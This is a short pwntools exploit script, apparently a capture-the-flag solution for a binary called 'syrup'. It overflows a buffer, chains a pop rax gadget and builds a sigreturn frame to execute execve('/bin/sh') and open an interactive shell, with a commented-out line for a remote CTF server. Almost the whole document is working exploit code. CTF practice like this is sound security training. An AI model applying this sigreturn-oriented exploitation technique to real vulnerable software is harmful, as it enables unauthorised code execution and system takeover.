#!/usr/bin/python3

from pwn import *

binary = ELF('./syrup')
context.update(arch='amd64',os='linux')

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(binary.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rip = next(binary.search(asm('syscall')))

payload  = 0x400 * b'A'
payload += p64(0xdead ^ 0xbeef)

'''
# clever method, uses bp to pass 0xf to rax in fn2
payload += p64(constants.SYS_rt_sigreturn)
payload += p64(binary.symbols['fn2'])
payload += bytes(frame)
'''
# less clever, calls directly to the pop rax in fn2, pops the 0xf
payload += p64(0x0)
payload += p64(0x00401004) # pop rax
payload += p64(constants.SYS_rt_sigreturn)
payload += bytes(frame)
#'''

p = process(binary.path)
#p = remote('jh2i.com', 50036)

p.recvuntil('Can you pwn me?')
p.sendline(payload)
p.interactive()
